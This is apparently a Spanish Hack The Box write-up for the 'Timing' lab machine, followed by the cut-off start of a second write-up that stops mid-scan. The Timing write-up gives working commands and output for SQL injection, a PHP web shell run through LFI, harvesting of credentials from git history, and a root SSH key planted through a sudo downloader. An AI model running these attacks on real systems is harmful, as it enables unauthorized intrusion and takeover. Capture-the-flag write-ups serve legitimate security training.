profile.php:\n$ read_file profile.php  \u0026lt;?php include_once \"header.php\"; include_once \"db_conn.php\"; $id = $_SESSION['userid']; // fetch updated user $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u0026gt;execute(array('id' =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); ?\u0026gt; \u0026lt;script src=\"js/profile.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div class=\"container bootstrap snippets bootdey\"\u0026gt; \u0026lt;div class=\"alert alert-success\" id=\"alert-profile-update\" style=\"display: none\"\u0026gt; \u0026lt;strong\u0026gt;Success!\u0026lt;/strong\u0026gt; Profile was updated. \u0026lt;/div\u0026gt; \u0026lt;h1 class=\"text-primary\"\u0026gt;\u0026lt;span class=\"glyphicon glyphicon-user\"\u0026gt;\u0026lt;/span\u0026gt;Edit Profile\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div class=\"row\"\u0026gt; \u0026lt;!-- left column --\u0026gt; \u0026lt;div class=\"col-md-1\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- edit form column --\u0026gt; \u0026lt;div class=\"col-md-9 personal-info\"\u0026gt; \u0026lt;h3\u0026gt;Personal info\u0026lt;/h3\u0026gt; \u0026lt;form class=\"form-horizontal\" role=\"form\" id=\"editForm\" action=\"#\" method=\"POST\"\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;First name:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"firstName\" id=\"firstName\" value=\"\u0026lt;?php if (!empty($user['firstName'])) echo $user['firstName']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;Last name:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"lastName\" id=\"lastName\" value=\"\u0026lt;?php if (!empty($user['lastName'])) echo $user['lastName']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;Company:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"company\" id=\"company\" value=\"\u0026lt;?php if (!empty($user['company'])) echo $user['company']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;Email:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"email\" id=\"email\" value=\"\u0026lt;?php if (!empty($user['email'])) echo $user['email']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"container\"\u0026gt; \u0026lt;div class=\"row\"\u0026gt; \u0026lt;div class=\"col-md-9 bg-light text-right\"\u0026gt; \u0026lt;button type=\"button\" onclick=\"updateProfile()\" class=\"btn btn-primary\"\u0026gt; Update \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php include_once \"footer.php\"; ?\u0026gt;  Utiliza auth_check.php, entonces nos lo podemos saltar y acceder a profile.php:\nSi miramos el código HTML, veremos que el \u0026lt;form\u0026gt; llama a updateProfile() mediante JavaScript. Este archivo es accesible en /js/profile.js:\n$ curl 10.10.11.135/js/profile.js  function updateProfile() { var xml = new XMLHttpRequest(); xml.onreadystatechange = function () { if (xml.readyState == 4 \u0026amp;\u0026amp; xml.status == 200) { document.getElementById(\"alert-profile-update\").style.display = \"block\" } }; xml.open(\"POST\", \"profile_update.php\", true); xml.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xml.send(\"firstName=\" + document.getElementById(\"firstName\").value + \"\u0026amp;lastName=\" + document.getElementById(\"lastName\").value + \"\u0026amp;email=\" + document.getElementById(\"email\").value + \"\u0026amp;company=\" + document.getElementById(\"company\").value); }  La petición se realiza mediante AJAX hacia profile_update.php. Vamos a leerlo:\n$ read_file profile_update.php  \u0026lt;?php include \"auth_check.php\"; $error = \"\"; if (empty($_POST['firstName'])) { $error = 'First Name is required.'; } else if (empty($_POST['lastName'])) { $error = 'Last Name is required.'; } else if (empty($_POST['email'])) { $error = 'Email is required.'; } else if (empty($_POST['company'])) { $error = 'Company is required.'; } if (!empty($error)) { die(\"Error updating profile, reason: \" . $error); } else { include \"db_conn.php\"; $id = $_SESSION['userid']; $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u0026gt;execute(array('id' =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); if ($user !== false) { ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL); $firstName = $_POST['firstName']; $lastName = $_POST['lastName']; $email = $_POST['email']; $company = $_POST['company']; $role = $user['role']; if (isset($_POST['role'])) { $role = $_POST['role']; $_SESSION['role'] = $role; } // dont persist role $sql = \"UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id\"; $stmt = $pdo-\u0026gt;prepare($sql); $stmt-\u0026gt;execute(); $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u0026gt;execute(array('id' =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); // but return it to avoid confusion $user['role'] = $role; $user['6'] = $role; echo json_encode($user, JSON_PRETTY_PRINT); } else { echo \"No user with this id was found.\"; } } ?\u0026gt;  Aquí hay dos cosas. La primera que resalta es una inyección de código SQL debido a la interpolación de strings (el contenido de las variables se inserta en la consulta SQL sin sanitización):\n$sql = \"UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id\";  Usando SQLi, podemos conseguir el contenido de la base de datos (por ejemplo, los hashes de las contraseñas de aaron y admin) e incluso modificarlo.\nAdemás, podemos asignar el role a nuestra sesión, que puede servir para pasar la validación de admin_auth_check.php:\nif (isset($_POST['role'])) { $role = $_POST['role']; $_SESSION['role'] = $role; }  No obstante, todavía necesitamos una sesión válida para poder llegar a esas líneas de código.\nPero podemos seguir probando cosas, como deducción de contraseñas. Por suerte, la contraseña de aaron es justamente aaron. Ahora tenemos acceso legítimo a profile.php (sin necesidad de saltar validaciones):\nEn este punto, cambiaré el role a 1 en la sesión del usuario. Para ello, usaré curl con la cookie PHPSESSID correspondiente:\n$ curl '10.10.11.135/login.php?login=true' -sid 'user=aaron\u0026password=aaron' | grep PHPSESSID Set-Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a; expires=Wed, 01-Jun-2022 20:17:47 GMT; Max-Age=3600; path=/ $ curl '10.10.11.135/profile_update.php?login.php' -sH 'Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a' -d \"firstName=x\u0026lastName=x\u0026email=x\u0026company=x\u0026role=1\" { \"id\": \"2\", \"0\": \"2\", \"username\": \"aaron\", \"1\": \"aaron\", \"password\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"2\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"lastName\": \"x\", \"3\": \"x\", \"firstName\": \"x\", \"4\": \"x\", \"email\": \"x\", \"5\": \"x\", \"role\": \"1\", \"6\": \"1\", \"company\": \"x\", \"7\": \"x\" } $ curl '10.10.11.135/admin_auth_check.php?login.php' -H 'Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a'  Ahora ya no hay errores en admin_auth_check.php, porque nuestra sesión tiene role igual a \u0026quot;1\u0026quot;, que es el mismo valor que 1 (Type Juggling).\nSolo por mostrar cómo explotar el SQLi para conseguir acceso como admin (de manera que no haría falta cambiar el rol de aaron), podemos usar el siguiente payload para modificar la contraseña de admin y poner la misma que tiene aaron (directamente ponemos el hash de aaron):\nfirstName=admin',password='$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq' where id=1-- -  $ curl '10.10.11.135/profile_update.php?login.php' -sH 'Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a' -d \"firstName=admin',password='\\$2y\\$10\\$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq'+where+id=1--+-\u0026lastName=x\u0026email=x\u0026company=x\u0026role=1\" { \"id\": \"2\", \"0\": \"2\", \"username\": \"aaron\", \"1\": \"aaron\", \"password\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"2\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"lastName\": \"x\", \"3\": \"x\", \"firstName\": \"x\", \"4\": \"x\", \"email\": \"x\", \"5\": \"x\", \"role\": \"1\", \"6\": \"1\", \"company\": \"x\", \"7\": \"x\" }  Y ahora tenemos acceso con credenciales admin:aaron:\nY podemos ver la función de subir archivos directamente desde el navegador:\nConsiguiendo RCE En este punto, tenemos que subir un archivo con código PHP para ganar RCE a través del LFI. Vamos a recordar el código fuente de upload.php:\n$ read_file upload.php  \u0026lt;?php include(\"admin_auth_check.php\"); $upload_dir = \"images/uploads/\"; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]); $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } } // Check if file already exists if (file_exists($target_file)) { $error = \"Sorry, file already exists.\"; } if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; } if (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; } ?\u0026gt;  Hay muchas cosas que analizar. Primero de todo, el archivo se guardará en /images/uploads/ y el nombre del archivo será:\n$file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]);  Hay un error aquí, ya que $file_hash no hace nada. El uso de comillas simples en lugar de dobles afecta, veámoslo:\n$ php -a Interactive shell php \u0026gt; $file_hash = uniqid(); php \u0026gt; echo '$file_hash'; $file_hash php \u0026gt; echo \"$file_hash\"; 6297dc93794b4  Además, el nombre del archivo es el hash MD5 de una cadena de texto con un valor de tiempo:\nphp \u0026gt; $file = 'r.php'; php \u0026gt; $file_name = md5('$file_hash' . time()) . '_' . basename($file); php \u0026gt; echo $file_name; 8341c71500f186c3ce6ca74204769606_r.php  La string de la que se hace el hash es algo así:\nphp \u0026gt; echo '$file_hash' . time(); $file_hash1654119787 php \u0026gt; echo '$file_hash' . time(); $file_hash1654119788 php \u0026gt; echo '$file_hash' . time(); $file_hash1654119789 php \u0026gt; echo '$file_hash' . time(); $file_hash1654119790  Cambia cada segundo. Existe otra validación si ponemos submit en el formulario de petición:\nif (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } }  Otra validación importante es la extensión del archivo:\n$upload_dir = \"images/uploads/\"; // ... $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); // ... if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; }  Con r.php, se obtiene extensión php:\nphp \u0026gt; $upload_dir = \"images/uploads/\"; php \u0026gt; $target_file = $upload_dir . $file_name; php \u0026gt; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); php \u0026gt; echo $imageFileType; php  Pero si ponemos r.php.jpg, la extensión del archivo cambia a jpg:\nphp \u0026gt; $file = 'r.php.jpg'; php \u0026gt; $file_name = md5('$file_hash' . time()) . '_' . basename($file); php \u0026gt; echo $file_name; 9a3b65d2e18bf402d3715ac15ec5be2a_r.php.jpg php \u0026gt; $target_file = $upload_dir . $file_name; php \u0026gt; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); php \u0026gt; echo $imageFileType; jpg  Si no hay errores, el archivo se guarda en /images/uploads/:\nif (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; }  En este punto, decidí escribir un script en Python para hacer todo lo necesario para subir el archivo y obtener la URL del archivo con la web shell en PHP: upload.py (explicación detallada aquí):\n$ python3 upload.py Cookie: PHPSESSID=dg8sokd2ki84a93ggp2tttrlm6 RCE: http://10.10.11.135/images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg $ curl 10.10.11.135/images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg \u0026lt;?php system($_GET[\"cmd\"]); ?\u0026gt;  Y ahí tenemos nuestra web shell. Ahora tenemos RCE mediante LFI:\n$ curl '10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg\u0026cmd=whoami' www-data  Sin embargo, no somos capaces de obtener una reverse shell en el servidor. Debe ser que algunas reglas de iptables que no permiten conexiones. Por tanto, tenemos que seguir con la web shell.\nEnumeración del sistema Definí otra función en Bash para que los comandos fueran más cortos:\n$ function rce() { curl -sG 'http://10.10.11.135/image.php' --data-urlencode 'img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg' --data-urlencode \"cmd=$1\" -o -; } $ rce 'ls -la' total 72 drwxr-xr-x 5 www-data www-data 4096 Dec 2 14:10 . drwxr-xr-x 5 www-data www-data 4096 Nov 29 2021 .. -rw-r--r-- 1 root root 200 Jul 18 2021 admin_auth_check.php -rw-r--r-- 1 root root 379 Jul 22 2021 auth_check.php -rw-r--r-- 1 root root 1268 Jul 18 2021 avatar_uploader.php drwxrwxr-x 2 root root 4096 Nov 29 2021 css -rw-r--r-- 1 root root 92 Jul 20 2021 db_conn.php -rw-r--r-- 1 root root 3937 Jul 18 2021 footer.php -rw-r--r-- 1 root root 1498 Nov 30 2021 header.php -rw-r--r-- 1 root root 507 Jul 18 2021 image.php drwxrwxr-x 3 root root 4096 Nov 29 2021 images -rw-r--r-- 1 root root 188 Jul 18 2021 index.php drwxrwxr-x 2 root root 4096 Nov 29 2021 js -rw-r--r-- 1 root root 2072 Oct 5 2021 login.php -rw-r--r-- 1 root root 113 Jul 18 2021 logout.php -rw-r--r-- 1 root root 3041 Jul 18 2021 profile.php -rw-r--r-- 1 root root 1740 Jul 18 2021 profile_update.php -rw-r--r-- 1 root root 1018 Dec 2 14:10 upload.php  Incluso si tratamos de generar claves SSH y las añadimos a /var/www/.ssh/authorized_keys, no se nos permite acceder al servidor:\n$ rce 'grep www-data /etc/passwd' www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin $ rce 'mkdir /var/www/.ssh' $ rce 'ls -la /var/www/' total 24 drwxr-xr-x 6 www-data www-data 4096 Jun 1 20:42 . drwxr-xr-x 14 root root 4096 Nov 29 2021 .. lrwxrwxrwx 1 root root 9 Oct 5 2021 .bash_history -\u0026gt; /dev/null drwxr-x--- 3 www-data www-data 4096 Nov 29 2021 .config drwx------ 2 www-data www-data 4096 Nov 29 2021 .gnupg drwxr-xr-x 2 www-data www-data 4096 Jun 1 20:42 .ssh drwxr-xr-x 5 www-data www-data 4096 Dec 2 14:10 html $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsa Your public key has been saved in id_rsa.pub The key fingerprint is: SHA256:QFWHOQWlYor2bYFXtmu8ECG1hadx1221W94UFrjp7ck The key's randomart image is: +---[RSA 3072]----+ | ..oo+*+..=+| | . .oo*o..o =| | o ==+o ooo| | . *.= . o o+| | o o S . . ..o| | . . o + . . . | | . + + o .| | . o . E | | . | +----[SHA256]-----+ $ rce \"echo '$(cat id_rsa.pub)' \u0026gt;\u0026gt; /var/www/.ssh/authorized_keys\" $ rce 'ls -la /var/www/.ssh' total 12 drwxr-xr-x 2 www-data www-data 4096 Jun 1 20:43 . drwxr-xr-x 7 www-data www-data 4096 Jun 1 20:44 .. -rw-r--r-- 1 www-data www-data 575 Jun 1 20:45 authorized_keys $ ssh -i id_rsa www-data@10.10.11.135 bash This account is currently not available.  Podemos ver los permisos que tiene el directorio /home/aaron:\n$ rce 'ls -la /home/' total 12 drwxr-xr-x 3 root root 4096 Dec 2 09:55 . drwxr-xr-x 24 root root 4096 Nov 29 2021 .. drwxr-x--x 5 aaron aaron 4096 Jun 1 20:36 aaron  Podemos acceder a los archivos internos si conocemos el nombre completo. Por ejemplo:\n$ rce 'ls -la /home/aaron/.bashrc' -rw-r--r-- 1 aaron aaron 3771 Apr 4 2018 /home/aaron/.bashrc $ rce 'ls -la /home/aaron/.bash_history' lrwxrwxrwx 1 root root 9 Oct 5 2021 /home/aaron/.bash_history -\u0026gt; /dev/null $ rce 'ls -la /home/aaron/user.txt' -rw-r----- 1 root aaron 33 Jun 1 04:01 /home/aaron/user.txt  Puede parecer raro, pero vamos a usar ffuf otra vez para enumerar directorios y archivos dentro de /home/aaron/:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg\u0026cmd=ls+-la+/home/aaron/FUZZ' -e .txt -fs 0 user.txt [Status: 200, Size: 61, Words: 10, Lines: 2, Duration: 47ms]  Vamos a añadir . al principio del nombre del archivo para mirar por archivos y directorios ocultos, pero nada interesante:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg\u0026cmd=ls+-la+/home/aaron/.FUZZ' -e .txt -fs 0 profile [Status: 200, Size: 63, Words: 11, Lines: 2, Duration: 67ms] local [Status: 200, Size: 149, Words: 29, Lines: 5, Duration: 108ms]  Entonces, tenemos que seguir enumerando manualmente. Al final, veremos que hay una copia de seguridad en /opt/:\n$ rce 'ls -la /opt' total 624 drwxr-xr-x 2 root root 4096 Dec 2 11:19 . drwxr-xr-x 24 root root 4096 Nov 29 2021 .. -rw-r--r-- 1 root root 627851 Jul 20 2021 source-files-backup.zip  Por tanto, vamos a descargarla y a analizarla:\n$ rce 'cat /opt/source-files-backup.zip' \u0026gt; source-files-backup.zip $ file source-files-backup.zip source-files-backup.zip: Zip archive data, at least v1.0 to extract, compression method=store  Todo está correcto. Con unzip -l podemos verificar que el contenido del archivo ZIP no es malicioso, y luego descomprimirlo. Tenemos estos directorios:\n$ unzip -q source-files-backup.zip $ ls -a backup . auth_check.php footer.php index.php profile.php .. avatar_uploader.php header.php js profile_update.php .git css image.php login.php upload.php admin_auth_check.php db_conn.php images logout.php  Existe el directorio .git, por lo que tenemos que mirar las confirmaciones (commits) antiguas a ver si hay algo útil:\n$ git log commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -\u0026gt; master) Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:34:13 2021 +0000 db_conn updated commit e4e214696159a25c69812571c8214d2bf8736a3f Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:33:54 2021 +0000 init  Vamos a ver las diferencias entre estos dos commits:\n$ git diff 16de e4e2 diff --git a/db_conn.php b/db_conn.php index 5397ffa..f1c9217 100644 --- a/db_conn.php +++ b/db_conn.php @@ -1,2 +1,2 @@ \u0026lt;?php -$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd'); +$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');  Genial, tenemos otra contraseña. Vamos a probar a acceder como aaron por SSH:\n$ ssh aaron@10.10.11.135 aaron@10.10.11.135's password: aaron@timing:~$ cat user.txt 19651c57fd7a5d96ab331ed4a8d40602  ¡Y ahí está! Por fin conseguimos acceder a la máquina.\nEscalada de privilegios Este usuario es capaz de ejecutar /usr/bin/netutils como root usando sudo:\naaron@timing:~$ sudo -l Matching Defaults entries for aaron on timing: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User aaron may run the following commands on timing: (ALL) NOPASSWD: /usr/bin/netutils  Se trata de un script en Bash que usa un archivo JAR:\n/usr/bin/netutils: Bourne-Again shell script, ASCII text executable aaron@timing:~$ cat /usr/bin/netutils #! /bin/bash java -jar /root/netutils.jar  Aunque java no se llama usando una ruta absolutam no es vulnerable a PATH hijacking porque existe una opción secure_path en la configuración de sudo.\nTampoco tenemos acceso al archivo JAR:\naaron@timing:~$ ls -la /root/netutils.jar ls: cannot access '/root/netutils.jar': Permission denied  Por tanto, tenemos que realizar un análisis dinámico y deducir lo que hace:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt;  Vamos a probar HTTP y escuchar con nc:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 1 Enter Url: http://10.10.17.44 Initializing download: http://10.10.17.44 Connection gone.  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.135. Ncat: Connection from 10.10.11.135:35202. GET / HTTP/1.0 Host: 10.10.17.44 Accept: */* Range: bytes=1- User-Agent: Axel/2.16.1 (Linux) ^C  Interesante, está usando axel por detrás, que sirve para descargar archivos por línea de comandos. Para ver lo que hace, usaré otra sesión SSH y pondré un servidor web Python en local:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 1 Enter Url: http://127.0.0.1:8000/user.txt Initializing download: http://127.0.0.1:8000/user.txt File size: 33 bytes Opening output file user.txt.0 Server unsupported, starting from scratch with one connection. Starting download Downloaded 33 byte in 0 seconds. (0.32 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 2  aaron@timing:~$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 127.0.0.1 - - [] \"GET /user.txt HTTP/1.0\" 200 - 127.0.0.1 - - [] \"GET /user.txt HTTP/1.0\" 200 - ^C Keyboard interrupt received, exiting. aaron@timing:~$ ls -la total 40 drwxr-x--x 5 aaron aaron 4096 Jun 1 22:43 . drwxr-xr-x 3 root root 4096 Dec 2 09:55 .. lrwxrwxrwx 1 root root 9 Oct 5 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 aaron aaron 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 aaron aaron 3771 Apr 4 2018 .bashrc drwx------ 2 aaron aaron 4096 Nov 29 2021 .cache drwx------ 3 aaron aaron 4096 Nov 29 2021 .gnupg drwxrwxr-x 3 aaron aaron 4096 Nov 29 2021 .local -rw-r--r-- 1 aaron aaron 807 Apr 4 2018 .profile -rw-r----- 1 root aaron 33 Jun 1 22:39 user.txt -rw-r--r-- 1 root root 33 Jun 1 22:43 user.txt.0 lrwxrwxrwx 1 root root 9 Oct 5 2021 .viminfo -\u0026gt; /dev/null aaron@timing:~$ cat user.txt.0 19651c57fd7a5d96ab331ed4a8d40602 aaron@timing:~$ rm user.txt.0 rm: remove write-protected regular file 'user.txt.0'? y  Se ve que el programa Java ha descargado user.txt y lo ha guardado como user.txt.0 (como root).\nLa idea aquí es que tenemos una manera de escribir archivos como root. Sin embargo, si el archivo ya existe, entonces será guardado como el mismo nombre .0. A primera vista, parece que no podemos usar un enlace simbólico que apunte a /root/.ssh/authorized_keys porque el archivo existiría al mismo tiempo que se descarga la clave pública SSH. Pero como /root/.ssh/authorized_keys no existe por defecto, el enlace simbólico se interpretará como que no existe, pudiendo escribir en el archivo.\nPodemos crear el enlace simbólico con el siguiente comando:\naaron@timing:~$ ln -s /root/.ssh/authorized_keys ~/id_rsa.pub  Luego, arrancamos un servidor web con Python en la máquina de atacante y exponemos id_rsa.pub (reutilizo la que generé antes):\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  Finalmente, pedimos la clave pública con /usr/bin/netutils:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input  1 Enter Url: http://10.10.17.44/id_rsa.pub Initializing download: http://10.10.17.44/id_rsa.pub File size: 575 bytes Opening output file id_rsa.pub Server unsupported, starting from scratch with one connection. Starting download Downloaded 575 byte in 0 seconds. (2.80 KB/s)  $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.135 - - [] \"GET /index.php HTTP/1.0\" 200 - ::ffff:10.10.11.135 - - [] \"GET /index.php HTTP/1.0\" 200 - ^C Keyboard interrupt received, exiting.  Y luego accedemos como root proporcionando la clave privada:\n$ ssh -i id_rsa root@10.10.11.135 root@timing:~# cat root.txt 1c40aa67ba2b39849421c84c0253cde4  ","image":"/images/HTB/Timing/Timing.png","permalink":"https://7rocky.github.io/htb/timing/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una aplicación web en PHP que es vulnerable a enumeración de usuarios, LFI, Type Juggling y SQLi, aparte de otros errores y malas configuraciones. Después de leer el código PHP, se encuentra una manera de subir un archivo PHP para conseguir RCE. Luego encontramos una contraseña en un repositorio de Git y accedemos por SSH. Entonces, podemos ejecutar un archivo JAR con sudo que descarga archivos como root, y se puede usar un enlace simbólico para escribir una clave SSH como autorizada para root","time":18,"title":"Timing"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.136   Fecha: 08 / 01 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.136 -p 22,80 Nmap scan report for 10.10.11.136 Host is up (0.069s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 83.09 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.136, veremos esta página web:\nAparece panda.htb, por lo que podemos añadir el dominio en /etc/hosts. Pero no hay nada diferente si usamos el dominio.\nPodemos aplicar fuzzing para enumerar rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.136/FUZZ assets [Status: 301, Size: 313, Words: 20, Lines: 10] [Status: 200, Size: 33560, Words: 13127, Lines: 908] server-status [Status: 403, Size: 277, Words: 20, Lines: 10]  No hay nada interesante. En la web, no hay entrada de usuario\u0026hellip; Hemos llegado a un punto muerto.\nEnumeración por UDP Una de las últimas cosas que hay que enumerar es UDP, a lo mejor hay servicios que utilizan UDP que no hemos visto con la ejecución de nmap inicial. Vamos a realizar el escaneo:\n# nmap -sU --top-ports 100 -n -Pn -vv 10.10.11.136 Starting Nmap 7.92 ( https://nmap.org ) Initiating UDP Scan Scanning 10.10.11.136 [100 ports] Increasing send delay for 10.10.11.136 from 0 to 50 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.11.136 from 50 to 100 due to max_successful_tryno increase to 5 Increasing send delay for 10.10.11.136 from 100 to 200 due to 11 out of 12 dropped probes since last increase. Increasing send delay for 10.10.11.136 from 200 to 400 due to max_successful_tryno increase to 6 Increasing send delay for 10.10.11.136 from 400 to 800 due to max_successful_tryno increase to 7 Increasing send delay for 10.10.11.136 from 800 to 1000 due to max_successful_tryno increase to 8 Discovered open port 161/udp on 10.10.11.136 Completed UDP Scan, 98.23s elapsed (100 total ports) Nmap scan report for 10.10.11.136 Host is up, received user-set (0.053s latency). Scanned for 98s Not shown: 99 closed udp ports (port-unreach) PORT STATE SERVICE REASON 161/udp open snmp udp-response ttl 63 Nmap done: 1 IP address (1 host up) scanned in 